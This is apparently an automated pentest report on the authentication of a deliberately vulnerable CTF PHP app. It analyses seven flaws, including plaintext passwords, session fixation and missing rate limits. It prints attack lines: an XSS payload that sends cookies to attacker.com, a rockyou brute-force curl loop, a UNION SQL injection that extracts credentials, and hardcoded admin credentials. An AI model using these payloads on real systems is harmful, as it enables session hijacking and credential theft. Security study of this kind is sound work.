# Authentication Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** Critical authentication vulnerabilities were identified across all security layers: transport security, session management, credential storage, abuse prevention, and authentication flow logic. The application demonstrates systematic failure of authentication security controls.
- **Purpose of this Document:** This report provides strategic context on the application's authentication mechanisms, dominant vulnerability patterns, and architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of Transport Security
- **Description:** The application exposes all authentication endpoints over unencrypted HTTP with no HTTPS enforcement, no HSTS headers, and no secure transport configuration at any layer (application, web server, or infrastructure).
- **Implication:** All authentication traffic including credentials, session cookies, and the FLAG value are transmitted in plaintext, enabling trivial man-in-the-middle (MITM) attacks and network-based credential harvesting.
- **Representative Findings:** `AUTH-VULN-01` (Transport Exposure)

### Pattern 2: Catastrophic Session Management Failures
- **Description:** A systematic pattern of session security violations including missing HttpOnly/Secure/SameSite flags, no session ID rotation after authentication, no logout functionality, and unreliable session timeouts.
- **Implication:** Attackers can hijack sessions through XSS-based cookie theft, network interception, and session fixation attacks. Sessions persist indefinitely with no mechanism for explicit termination.
- **Representative Findings:** `AUTH-VULN-02` (Session Cookie Misconfiguration), `AUTH-VULN-03` (Session Fixation), `AUTH-VULN-04` (Missing Logout)

### Pattern 3: Zero Abuse Prevention Controls
- **Description:** Complete absence of rate limiting, CAPTCHA, account lockout, IP throttling, or monitoring on authentication endpoints.
- **Implication:** Attackers can perform unlimited brute-force, credential stuffing, and password spraying attacks with zero resistance or detection.
- **Representative Findings:** `AUTH-VULN-05` (No Rate Limiting)

### Pattern 4: Plaintext Credential Storage
- **Description:** Passwords are stored in plaintext varchar(256) database columns with no cryptographic hashing (no bcrypt, Argon2, PBKDF2, or any password_hash() usage).
- **Implication:** Any database breach or SQL injection (already confirmed in search.php) immediately exposes all user credentials without requiring any cracking effort.
- **Representative Findings:** `AUTH-VULN-06` (Plaintext Password Storage)

### Pattern 5: Information Disclosure via Authentication Flow
- **Description:** Differential error messages reveal whether usernames exist in the system ("Invalid password." vs "Error! "), enabling targeted enumeration attacks.
- **Implication:** Attackers can build lists of valid usernames before attempting password attacks, significantly reducing attack complexity.
- **Representative Findings:** `AUTH-VULN-07` (Username Enumeration)

## 3. Strategic Intelligence for Exploitation

### Authentication Architecture
- **Authentication Method:** Custom PHP implementation using prepared statements for SQL queries (MySQL backend)
- **Session Management:** PHP native file-based sessions with PHPSESSID cookie
- **Password Storage:** Plaintext comparison against database varchar(256) column
- **Default Credentials:** admin:ThisIsBestPassword (hardcoded in mysql/init.sql:13)
- **Authentication State:** Sessions initialized but NEVER used for storing authentication state (no $_SESSION variables set after login)

### Session Token Details
- **Cookie Name:** PHPSESSID
- **Token Length:** 32 hexadecimal characters (128 bits of entropy)
- **Token Generation:** PHP 7.4.33 default CSPRNG via random_bytes() - cryptographically secure
- **Token Transmission:** Cookie-only (session.use_only_cookies = 1, no URL rewriting)
- **Token Security Flags:** ALL DISABLED (httponly=0, secure=0, samesite=none)
- **Token Rotation:** NEVER occurs (no session_regenerate_id() call after authentication)

### Authentication Flow Details
1. **Session Initialization:** login.php:2 calls session_start(), creates PHPSESSID cookie
2. **Credential Submission:** POST /login.php accepts username and password via $_POST
3. **Validation:** Prepared statement at line 28: "SELECT * FROM users WHERE username = ? AND password = ?"
4. **Success Response:** line 36 displays FLAG and calls die() - NO session state is set
5. **Failure Responses:** Differential errors at lines 40 ("Invalid password.") and 43 ("Error! ")

### Password Policy
- **Hashing Algorithm:** NONE - plaintext storage
- **Policy Enforcement:** N/A - no registration endpoint exists
- **Default Password Strength:** WEAK - "ThisIsBestPassword" is composed of dictionary words in title-case pattern
- **Validation:** Zero client-side or server-side password strength checks

### Critical Code Locations
- **Authentication Logic:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php:23-47
- **Session Initialization:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php:2
- **Database Credentials:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql:13
- **Infrastructure Config:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/docker-compose.yml:16-17 (HTTP only)

## 4. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses. They are low-priority for further testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| SQL Injection Protection (Login) | `/app/login.php:28-31` | Uses mysqli prepared statements with bind_param() for parameterized queries | SAFE |
| Session ID Generation | PHP 7.4.33 default (random_bytes) | Cryptographically secure random number generator with 128 bits of entropy | SAFE |
| Session ID Transmission | PHP session configuration | Cookie-only transmission (session.use_only_cookies = 1), no URL rewriting | SAFE |
| Session ID Logging | Apache default configuration | PHPSESSID not logged in access.log (combined format excludes Cookie header) | SAFE |

## 5. Attack Surface Summary

### Authentication Endpoints
- **POST /login.php** - Primary authentication endpoint (lines 23-47)
  - Accepts: username, password via POST body
  - Returns: FLAG on success, differential errors on failure
  - Vulnerabilities: No rate limiting, username enumeration, plaintext passwords, session fixation
  
- **GET /login.php** - Login form display (lines 52-62)
  - Returns: HTML form with minimal client-side validation
  - Vulnerabilities: No CSRF token, no CAPTCHA

- **GET /index.php** - Landing page
  - Calls session_start() but performs no authentication checks
  - Minimal attack surface (static HTML with navigation links)

### Notable Absences
- **No logout endpoint** - No /logout.php or session destruction mechanism
- **No registration endpoint** - No user creation functionality
- **No password reset** - No password recovery mechanism
- **No MFA/2FA** - No multi-factor authentication
- **No OAuth/SSO** - No third-party authentication integration

## 6. Exploitation Considerations

### Optimal Attack Path
1. **Direct Brute Force** (AUTH-VULN-05): Unlimited login attempts enable password guessing against known "admin" username
2. **Session Fixation** (AUTH-VULN-03): Set victim's PHPSESSID before authentication, hijack session after they log in
3. **Username Enumeration** (AUTH-VULN-07): Identify additional valid usernames via differential error messages
4. **Credential Stuffing** (AUTH-VULN-05): Test leaked credential pairs with no rate limiting resistance

### Alternative Path (Already Exploited in Recon)
- SQL injection in /search.php:25 extracts plaintext password "ThisIsBestPassword" directly from database
- Eliminates need for brute force or session attacks

### Session Hijacking Vectors
1. **XSS-based theft** (requires XSS in search.php:30): JavaScript can access PHPSESSID via document.cookie (HttpOnly disabled)
2. **Network interception** (AUTH-VULN-01): MITM captures PHPSESSID cookie over unencrypted HTTP
3. **Session fixation** (AUTH-VULN-03): Attacker pre-sets victim's session ID, session never regenerates

### Defensive Gaps
- **No monitoring/alerting** - Failed login attempts not logged or detected
- **No account lockout** - Unlimited failed attempts without temporary ban
- **No CAPTCHA** - Automated attacks proceed unhindered
- **No WAF/IPS** - No ModSecurity, fail2ban, or intrusion prevention

## 7. Compliance and Standards Violations

### OWASP Top 10 (2021)
- **A01:2021 - Broken Access Control:** Sessions never store authentication state, no logout mechanism
- **A02:2021 - Cryptographic Failures:** Plaintext password storage, no HTTPS, insecure session cookies
- **A07:2021 - Identification and Authentication Failures:** No rate limiting, weak default credentials, username enumeration

### OWASP ASVS 4.0
- **V2.1 (Password Security):** Fails - No hashing (requires bcrypt/Argon2/PBKDF2)
- **V2.2 (General Authenticator Security):** Fails - No rate limiting, no anti-automation
- **V3.2 (Session Binding):** Fails - No session regeneration, no secure flags
- **V3.3 (Session Timeout):** Fails - No explicit logout, unreliable timeout

### NIST SP 800-63B
- **Section 5.1.1.2 (Memorized Secret Verifiers):** Fails - Passwords must be salted and hashed
- **Section 5.2.2 (Rate Limiting):** Fails - Must implement rate limiting on authentication
- **Section 7.1 (Session Management):** Fails - Session tokens must use secure flags

### PCI-DSS 4.0
- **Requirement 8.2.1:** Fails - Authentication credentials must be unreadable during storage using strong cryptography
- **Requirement 8.3.4:** Fails - Must implement account lockout after failed attempts

## 8. Technical Deep-Dive: Critical Vulnerabilities

### Transport Security (AUTH-VULN-01)
**Infrastructure:** Docker exposes only HTTP port 80 (mapped to host 8080). Apache virtual host configured for `<VirtualHost *:80>` with no SSL module loaded. No reverse proxy, CDN, or TLS termination layer exists.

**Code Evidence:** Zero `$_SERVER['HTTPS']` checks, no HTTP-to-HTTPS redirects, no `Strict-Transport-Security` headers in any PHP files or Apache configuration.

**Exploitation:** Attacker on same network (public WiFi, compromised router) passively captures plaintext credentials via packet sniffing (tcpdump, Wireshark).

### Session Cookie Misconfiguration (AUTH-VULN-02)
**PHP Configuration:** session.cookie_httponly=0, session.cookie_secure=0, session.cookie_samesite='' (verified via php -i)

**HTTP Response:** `Set-Cookie: PHPSESSID=54550d57dda189efb71b1ac789ab8603; path=/` (missing all security flags)

**Exploitation:** XSS in search.php:30 executes `fetch('https://attacker.com/steal?c='+document.cookie)` to exfiltrate session tokens.

### Session Fixation (AUTH-VULN-03)
**Code Evidence:** login.php:2 calls session_start() before authentication. Line 36 displays FLAG and calls die() without calling session_regenerate_id(true).

**Configuration:** session.use_strict_mode=0 allows attacker-supplied session IDs to be accepted.

**Exploitation:** Attacker creates session (GET / → PHPSESSID=attacker_fixed_id), tricks victim into using this session ID, victim authenticates with fixed session, attacker hijacks authenticated session.

### No Rate Limiting (AUTH-VULN-05)
**Code Evidence:** login.php:23-47 contains zero request throttling, no tracking of failed attempts, no CAPTCHA checks, no account lockout logic.

**Infrastructure:** No mod_ratelimit, mod_evasive, fail2ban, or WAF in Docker configuration (docker-compose.yml defines only 2 services: web and db).

**Exploitation:** `for password in $(cat rockyou.txt); do curl -X POST http://target:8080/login.php -d "username=admin&password=$password"; done` executes unlimited brute force at network speed.

### Plaintext Password Storage (AUTH-VULN-06)
**Database Schema:** mysql/init.sql:7-10 defines `password varchar(256)` with no hash indicators.

**Seed Data:** mysql/init.sql:13 inserts `("admin", "ThisIsBestPassword")` as literal plaintext string.

**Code Evidence:** login.php:28 uses prepared statement but compares plaintext: `SELECT * FROM users WHERE username = ? AND password = ?`. No password_hash(), password_verify(), bcrypt, or Argon2 usage anywhere in codebase.

**Exploitation:** SQL injection in search.php:25 (recon-documented) extracts plaintext passwords: `" union select 1,concat(username,0x3a,password),3 from users#` returns `admin:ThisIsBestPassword`.

### Username Enumeration (AUTH-VULN-07)
**Code Evidence:** 
- Line 40: `echo "Invalid password.";` (valid username, wrong password)
- Line 43: `echo "Error! ";` (invalid username)

**Exploitation:** `curl -X POST http://target:8080/login.php -d "username=admin&password=wrong"` returns "Invalid password." (username exists). Testing "nonexistent" returns "Error! " (username doesn't exist).

## 9. Risk Quantification

### CVSS 3.1 Scores

**AUTH-VULN-01 (Transport Exposure):** CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = **8.1 (HIGH)**
**AUTH-VULN-02 (Session Cookie Flags):** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N = **6.5 (MEDIUM)**
**AUTH-VULN-03 (Session Fixation):** CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N = **6.8 (MEDIUM)**
**AUTH-VULN-05 (No Rate Limiting):** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L = **8.6 (HIGH)**
**AUTH-VULN-06 (Plaintext Passwords):** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = **9.1 (CRITICAL)**
**AUTH-VULN-07 (Username Enumeration):** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = **5.3 (MEDIUM)**

### Overall Authentication Security Grade: F (Critical Failure)

## 10. Conclusion

The PHPAbUsers application demonstrates **systematic failure across all authentication security domains**. Every layer of defense-in-depth is either missing or critically misconfigured:

- **Transport Layer:** No HTTPS, enabling plaintext credential interception
- **Session Layer:** No security flags, no rotation, no logout, enabling hijacking and fixation
- **Application Layer:** No rate limiting, no CAPTCHA, enabling unlimited brute force
- **Data Layer:** Plaintext password storage, enabling immediate credential compromise
- **Monitoring Layer:** Zero logging or alerting, enabling undetected attacks

Combined with the SQL injection vulnerability documented in the reconnaissance phase (search.php:25), the application provides multiple independent paths to full authentication bypass and credential compromise. This is a **deliberately vulnerable CTF challenge** that exemplifies anti-patterns for educational purposes, not production code.